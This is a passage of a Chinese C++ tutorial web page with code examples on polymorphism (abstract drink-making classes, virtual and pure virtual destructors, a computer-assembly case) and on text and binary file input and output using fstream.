class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;抽象制作饮品</span><br><span class="line">class AbstractDrinking &#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;烧水</span><br><span class="line">virtual void Boil() &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F;冲泡</span><br><span class="line">virtual void Brew() &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F;倒入杯中</span><br><span class="line">virtual void PourInCup() &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F;加入辅料</span><br><span class="line">virtual void PutSomething() &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F;规定流程</span><br><span class="line">void MakeDrink() &#123;</span><br><span class="line">Boil();</span><br><span class="line">Brew();</span><br><span class="line">PourInCup();</span><br><span class="line">PutSomething();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;制作咖啡</span><br><span class="line">class Coffee : public AbstractDrinking &#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;烧水</span><br><span class="line">virtual void Boil() &#123;</span><br><span class="line">cout &lt;&lt; &quot;煮农夫山泉!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;冲泡</span><br><span class="line">virtual void Brew() &#123;</span><br><span class="line">cout &lt;&lt; &quot;冲泡咖啡!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;倒入杯中</span><br><span class="line">virtual void PourInCup() &#123;</span><br><span class="line">cout &lt;&lt; &quot;将咖啡倒入杯中!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;加入辅料</span><br><span class="line">virtual void PutSomething() &#123;</span><br><span class="line">cout &lt;&lt; &quot;加入牛奶!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;制作茶水</span><br><span class="line">class Tea : public AbstractDrinking &#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;烧水</span><br><span class="line">virtual void Boil() &#123;</span><br><span class="line">cout &lt;&lt; &quot;煮自来水!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;冲泡</span><br><span class="line">virtual void Brew() &#123;</span><br><span class="line">cout &lt;&lt; &quot;冲泡茶叶!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;倒入杯中</span><br><span class="line">virtual void PourInCup() &#123;</span><br><span class="line">cout &lt;&lt; &quot;将茶水倒入杯中!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;加入辅料</span><br><span class="line">virtual void PutSomething() &#123;</span><br><span class="line">cout &lt;&lt; &quot;加入枸杞!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;业务函数</span><br><span class="line">void DoWork(AbstractDrinking* drink) &#123;</span><br><span class="line">drink-&gt;MakeDrink();</span><br><span class="line">delete drink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test01() &#123;</span><br><span class="line">DoWork(new Coffee);</span><br><span class="line">cout &lt;&lt; &quot;--------------&quot; &lt;&lt; endl;</span><br><span class="line">DoWork(new Tea);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="虚析构和纯虚析构"><a href="#虚析构和纯虚析构" class="headerlink" title="虚析构和纯虚析构"></a>虚析构和纯虚析构</h3><p>多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码</p><p>解决方式：将父类中的析构函数改为<strong>虚析构</strong>或者<strong>纯虚析构</strong></p><p>虚析构和纯虚析构共性：</p><ul><li>可以解决父类指针释放子类对象</li><li>都需要有具体的函数实现</li></ul><p>虚析构和纯虚析构区别：</p><ul><li>如果是纯虚析构，该类属于抽象类，无法实例化对象</li></ul><p>虚析构语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtual ~类名()&#123;&#125;</span><br></pre></td></tr></table></figure><p>纯虚析构语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">virtual ~类名() &#x3D; 0;</span><br><span class="line">类名::~类名()&#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">class Animal &#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Animal()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Animal 构造函数调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">virtual void Speak() &#x3D; 0;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;析构函数加上virtual关键字，变成虚析构函数</span><br><span class="line">&#x2F;&#x2F;virtual ~Animal()</span><br><span class="line">&#x2F;&#x2F;&#123;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; &quot;Animal虚析构函数调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">virtual ~Animal() &#x3D; 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Animal::~Animal()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Animal 纯虚析构函数调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;和包含普通纯虚函数的类一样，包含了纯虚析构函数的类也是一个抽象类。不能够被实例化。</span><br><span class="line"></span><br><span class="line">class Cat : public Animal &#123;</span><br><span class="line">public:</span><br><span class="line">Cat(string name)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Cat构造函数调用！&quot; &lt;&lt; endl;</span><br><span class="line">m_Name &#x3D; new string(name);</span><br><span class="line">&#125;</span><br><span class="line">virtual void Speak()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; *m_Name &lt;&lt;  &quot;小猫在说话!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">~Cat()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Cat析构函数调用!&quot; &lt;&lt; endl;</span><br><span class="line">if (this-&gt;m_Name !&#x3D; NULL) &#123;</span><br><span class="line">delete m_Name;</span><br><span class="line">m_Name &#x3D; NULL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">string *m_Name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Animal *animal &#x3D; new Cat(&quot;Tom&quot;);</span><br><span class="line">animal-&gt;Speak();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过父类指针去释放，会导致子类对象可能清理不干净，造成内存泄漏</span><br><span class="line">&#x2F;&#x2F;怎么解决？给基类增加一个虚析构函数</span><br><span class="line">&#x2F;&#x2F;虚析构函数就是用来解决通过父类指针释放子类对象</span><br><span class="line">delete animal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li><p>虚析构或纯虚析构就是用来解决通过父类指针释放子类对象</p></li><li><p>如果子类中没有堆区数据，可以不写为虚析构或纯虚析构</p></li><li><p>拥有纯虚析构函数的类也属于抽象类</p></li></ol><h3 id="多态案例三-电脑组装"><a href="#多态案例三-电脑组装" class="headerlink" title="多态案例三-电脑组装"></a>多态案例三-电脑组装</h3><p><strong>案例描述：</strong></p><p>电脑主要组成部件为 CPU（用于计算），显卡（用于显示），内存条（用于存储）</p><p>将每个零件封装出抽象基类，并且提供不同的厂商生产不同的零件，例如Intel厂商和Lenovo厂商</p><p>创建电脑类提供让电脑工作的函数，并且调用每个零件工作的接口</p><p>测试时组装三台不同的电脑进行工作</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;抽象CPU类</span><br><span class="line">class CPU</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;抽象的计算函数</span><br><span class="line">virtual void calculate() &#x3D; 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;抽象显卡类</span><br><span class="line">class VideoCard</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;抽象的显示函数</span><br><span class="line">virtual void display() &#x3D; 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;抽象内存条类</span><br><span class="line">class Memory</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;抽象的存储函数</span><br><span class="line">virtual void storage() &#x3D; 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;电脑类</span><br><span class="line">class Computer</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">Computer(CPU * cpu, VideoCard * vc, Memory * mem)</span><br><span class="line">&#123;</span><br><span class="line">m_cpu &#x3D; cpu;</span><br><span class="line">m_vc &#x3D; vc;</span><br><span class="line">m_mem &#x3D; mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;提供工作的函数</span><br><span class="line">void work()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;让零件工作起来，调用接口</span><br><span class="line">m_cpu-&gt;calculate();</span><br><span class="line"></span><br><span class="line">m_vc-&gt;display();</span><br><span class="line"></span><br><span class="line">m_mem-&gt;storage();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;提供析构函数 释放3个电脑零件</span><br><span class="line">~Computer()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;释放CPU零件</span><br><span class="line">if (m_cpu !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">delete m_cpu;</span><br><span class="line">m_cpu &#x3D; NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;释放显卡零件</span><br><span class="line">if (m_vc !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">delete m_vc;</span><br><span class="line">m_vc &#x3D; NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;释放内存条零件</span><br><span class="line">if (m_mem !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">delete m_mem;</span><br><span class="line">m_mem &#x3D; NULL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line"></span><br><span class="line">CPU * m_cpu; &#x2F;&#x2F;CPU的零件指针</span><br><span class="line">VideoCard * m_vc; &#x2F;&#x2F;显卡零件指针</span><br><span class="line">Memory * m_mem; &#x2F;&#x2F;内存条零件指针</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;具体厂商</span><br><span class="line">&#x2F;&#x2F;Intel厂商</span><br><span class="line">class IntelCPU :public CPU</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual void calculate()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Intel的CPU开始计算了！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class IntelVideoCard :public VideoCard</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual void display()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Intel的显卡开始显示了！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class IntelMemory :public Memory</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual void storage()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Intel的内存条开始存储了！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Lenovo厂商</span><br><span class="line">class LenovoCPU :public CPU</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual void calculate()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Lenovo的CPU开始计算了！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class LenovoVideoCard :public VideoCard</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual void display()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Lenovo的显卡开始显示了！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class LenovoMemory :public Memory</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual void storage()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Lenovo的内存条开始存储了！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;第一台电脑零件</span><br><span class="line">CPU * intelCpu &#x3D; new IntelCPU;</span><br><span class="line">VideoCard * intelCard &#x3D; new IntelVideoCard;</span><br><span class="line">Memory * intelMem &#x3D; new IntelMemory;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;第一台电脑开始工作：&quot; &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;创建第一台电脑</span><br><span class="line">Computer * computer1 &#x3D; new Computer(intelCpu, intelCard, intelMem);</span><br><span class="line">computer1-&gt;work();</span><br><span class="line">delete computer1;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;-----------------------&quot; &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;第二台电脑开始工作：&quot; &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;第二台电脑组装</span><br><span class="line">Computer * computer2 &#x3D; new Computer(new LenovoCPU, new LenovoVideoCard, new LenovoMemory);;</span><br><span class="line">computer2-&gt;work();</span><br><span class="line">delete computer2;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;-----------------------&quot; &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;第三台电脑开始工作：&quot; &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;第三台电脑组装</span><br><span class="line">Computer * computer3 &#x3D; new Computer(new LenovoCPU, new IntelVideoCard, new LenovoMemory);;</span><br><span class="line">computer3-&gt;work();</span><br><span class="line">delete computer3;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>程序运行时产生的数据都属于临时数据，程序一旦运行结束都会被释放</p><p>通过<strong>文件可以将数据持久化</strong></p><p>C++中对文件操作需要包含头文件 ==&lt; fstream &gt;==</p><p>文件类型分为两种：</p><ol><li><strong>文本文件</strong> - 文件以文本的<strong>ASCII码</strong>形式存储在计算机中</li><li><strong>二进制文件</strong> - 文件以文本的<strong>二进制</strong>形式存储在计算机中，用户一般不能直接读懂它们</li></ol><p>操作文件的三大类:</p><ol><li>ofstream：写操作</li><li>ifstream： 读操作</li><li>fstream ： 读写操作</li></ol><h2 id="文本文件"><a href="#文本文件" class="headerlink" title="文本文件"></a>文本文件</h2><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>写文件步骤如下：</p><ol><li><p>包含头文件</p><p>#include <fstream></p></li><li><p>创建流对象</p><p>ofstream ofs;</p></li><li><p>打开文件</p><p>ofs.open(“文件路径”,打开方式);</p></li><li><p>写数据</p><p>ofs &lt;&lt; “写入的数据”;</p></li><li><p>关闭文件</p><p>ofs.close();</p></li></ol><p>文件打开方式：</p><table><thead><tr><th>打开方式</th><th>解释</th></tr></thead><tbody><tr><td>ios::in</td><td>为读文件而打开文件</td></tr><tr><td>ios::out</td><td>为写文件而打开文件</td></tr><tr><td>ios::ate</td><td>初始位置：文件尾</td></tr><tr><td>ios::app</td><td>追加方式写文件</td></tr><tr><td>ios::trunc</td><td>如果文件存在先删除，再创建</td></tr><tr><td>ios::binary</td><td>二进制方式</td></tr></tbody></table><p><strong>注意：</strong> 文件打开方式可以配合使用，利用|操作符</p><p><strong>例如：</strong>用二进制方式写文件 <code>ios::binary | ios:: out</code></p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fstream&gt;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">ofstream ofs;</span><br><span class="line">ofs.open(&quot;test.txt&quot;, ios::out);</span><br><span class="line"></span><br><span class="line">ofs &lt;&lt; &quot;姓名：张三&quot; &lt;&lt; endl;</span><br><span class="line">ofs &lt;&lt; &quot;性别：男&quot; &lt;&lt; endl;</span><br><span class="line">ofs &lt;&lt; &quot;年龄：18&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">ofs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>文件操作必须包含头文件 fstream</li><li>读文件可以利用 ofstream ，或者fstream类</li><li>打开文件时候需要指定操作文件的路径，以及打开方式</li><li>利用&lt;&lt;可以向文件中写数据</li><li>操作完毕，要关闭文件</li></ul><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>读文件与写文件步骤相似，但是读取方式相对于比较多</p><p>读文件步骤如下：</p><ol><li><p>包含头文件</p><p>#include <fstream></p></li><li><p>创建流对象</p><p>ifstream ifs;</p></li><li><p>打开文件并判断文件是否打开成功</p><p>ifs.open(“文件路径”,打开方式);</p></li><li><p>读数据</p><p>四种方式读取</p></li><li><p>关闭文件</p><p>ifs.close();</p></li></ol><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">ifstream ifs;</span><br><span class="line">ifs.open(&quot;test.txt&quot;, ios::in);</span><br><span class="line"></span><br><span class="line">if (!ifs.is_open())</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;文件打开失败&quot; &lt;&lt; endl;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第一种方式</span><br><span class="line">&#x2F;&#x2F;char buf[1024] &#x3D; &#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;while (ifs &gt;&gt; buf)</span><br><span class="line">&#x2F;&#x2F;&#123;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第二种</span><br><span class="line">&#x2F;&#x2F;char buf[1024] &#x3D; &#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;while (ifs.getline(buf,sizeof(buf)))</span><br><span class="line">&#x2F;&#x2F;&#123;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第三种</span><br><span class="line">&#x2F;&#x2F;string buf;</span><br><span class="line">&#x2F;&#x2F;while (getline(ifs, buf))</span><br><span class="line">&#x2F;&#x2F;&#123;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">char c;</span><br><span class="line">while ((c &#x3D; ifs.get()) !&#x3D; EOF)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ifs.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>读文件可以利用 ifstream ，或者fstream类</li><li>利用is_open函数可以判断文件是否打开成功</li><li>close 关闭文件</li></ul><h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p>以二进制的方式对文件进行读写操作</p><p>打开方式要指定为 ==ios::binary==</p><h4 id="写文件-1"><a href="#写文件-1" class="headerlink" title="写文件"></a>写文件</h4><p>二进制方式写文件主要利用流对象调用成员函数write</p><p>函数原型 ：<code>ostream&amp; write(const char * buffer,int len);</code></p><p>参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 